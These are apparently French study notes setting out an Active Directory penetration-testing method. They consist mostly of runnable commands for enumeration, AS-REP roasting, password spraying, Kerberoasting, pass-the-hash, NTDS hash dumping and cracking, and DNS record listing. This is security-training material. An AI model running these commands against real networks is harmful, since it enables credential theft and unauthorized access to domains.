```toc

```
cf le cours sur l'AD : [[Cours/]]

# 1. Trouver le DC
La première étape consiste à trouver le contrôleur de domaine. Pour ça on peut :
- Utiliser *nslookup* car le DC sert souvent de DNS
- Utiliser *nmap* et regarder le port 88, ou tous les services exposés

# 2. Actions anonyme

## Enumération
```bash
# Enum all domain users, groups, ...
enum4linux -a -u "%" <DC_IP>

crackmapexec ldap
```

## ASREP Roast
Si la pré-authentification n'est pas obligatoire sur tous les comptes, on peut demander un TGT pour un utilisateur et on l'obtiendra. On ne pourra pas l'utiliser car on ne connait pas la clé privée de l'utilisateur mais on pourra essayer de le casser pour retrouver la clé de l'utilisateur.
```bash
# Test
impacket-GetNPUsers -dc-ip <DC_IP> -usersfile <file> <DOMAIN.FULL>/

# Get TGT
impacket-GetNPUsers -request -dc-ip <DC_IP> -usersfile <file> <DOMAIN.FULL>/ -outputfile hashes.asreproast
```
cf : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

# 3. Actions non-anonyme

## Énumération
```bash
enum4linux -a -u "user" -p "password" <DC_IP>

# Get all users (name, email, password age, last logon)
impacket-GetADUsers -all -dc-ip <DC_IP> <DOMAIN.FULL>/<username>

# Look for credentials in users description
crackmapexec ldap <DC_IP> -u 'user' -p 'password' -M get-desc-users
```

## Password spraying attack
Bien vérifier après combien de tentative les comptes sont bloqués !
```bash
# Get password policy
enum4linux -P -u "username" -p "password" <DC_IP>
# Get user list
enum4linux -U -u "username" -p "password" <DC_IP>

# Format user list, then SPRAY !
crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
# Use login as password
cme smb <IP> -u users.txt -p users.txt --no-bruteforce --continue-on-succes

# See if user is admin
ldapsearch -x -D '<DOMAIN>\<username>' -W -H ldap://<DC_IP> -b "dc=<DOMAIN>,dc=local" "(sAMAccountName=<username_to_test>)" memberOf
```
On peut lister les utilisateurs du groupe admin et les cibler en particulier.

## Kerberoast
On récupère tous les TGS possibles auxquels l'utilisateur `<username>` peut prétendre. Les TGS récupéré sont formés avec la clé privée des SPN pour lesquels ils sont valides. On peut alors essayer de casser ces TGS pour retrouver les mots de passe des SPN.
```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN.FULL>/<username> -outputfile hashes.kerberoast

# Cracking TGS to get SPN password
john --format=krb5tgs hashes.kerberoast
```



# 4. Accès à une machine
Dump des hash de mots de passe locaux.
Puis attaque Pass The Hash : `crackmapexec -H`


# 5. Pass The Hash
```bash
# List SMB shares
crakmapexec smb <ip_addr> --shares -u <user> -H <hash>

# Access a SMB repository
smbclient -U <domain>/<user> --pw-nt-hash --password=<hash> //<ip_addr>/<dir>
```

Dump base NTDS (tous les hash de tous les utilisateurs)
```bash
crakmapexec smb <ip_addr> -u <user> -H <hash> --ntds

# Format to keep only NT hash (4th elt)
john --format=NT <file>
john --format=NT <file> --show 
john --restore 
```
cf [[John The Ripper]].


# Autres
## Lister les entrées DNS
L'AD répertorie des entrées DNS et par défaut tous les utilisateurs peuvent les lister. Certaines entrées sont cachées, i.e. on accède seulement au nom DNS et pas à l'IP et au type d'entrée (A, AAAA, ...) mais on peut récupère l'IP en faisant une requète DNS (c'est l'option -r).
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-dns-records
```bash
# Display DNS zones
adidnsdump -u <domain>\\<user> ldap://<DC_IP> --print-zones

# Enum DNS records
adidnsdump -u <domain>\\<user> ldap://<DC_IP> -r
cat records.csv

# Enum DNS records from a zone
adidnsdump -u <domain>\\<user> ldap://<DC_IP>.<DNS_zone> -r
cat records.csv
```
